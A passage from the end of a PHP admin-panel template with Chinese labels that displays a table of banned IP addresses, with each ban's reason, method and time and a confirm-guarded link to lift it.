<?php endif; ?>
</script>

<?php if (empty($banned_ips)): ?>
<p style="color:#8080a0;padding:20px;text-align:center;">暂无封禁IP ✅</p>
<?php else: ?>
<div class="table-wrap">
    <table>
        <thead>
            <tr><th>IP地址</th><th>封禁原因</th><th>封禁方式</th><th>封禁时间</th><th>操作</th></tr>
        </thead>
        <tbody>
            <?php foreach ($banned_ips as $b): ?>
            <tr>
                <td><code><?php echo htmlspecialchars($b['ip_address']); ?></code></td>
                <td><?php echo htmlspecialchars(!empty($b['reason']) ? $b['reason'] : '违规行为，系统已封禁'); ?></td>
                <td><span class="badge badge-banned"><?php echo htmlspecialchars($b['banned_by'] ?? 'admin'); ?></span></td>
                <td><?php echo date('m-d H:i', strtotime($b['created_at'])); ?></td>
                <td><a href="?tab=banned&unban_ip=<?php echo urlencode($b['ip_address']); ?>" class="action-link" style="color:#4caf50;" onclick="return confirm('确定解封此IP？')"><i class="fas fa-check"></i> 解封</a></td>
            </tr>
            <?php endforeach; ?>
        </tbody>
    </table>
</div>
<?php endif; ?>

<?php endif; ?>
</div>
</body>
</html>
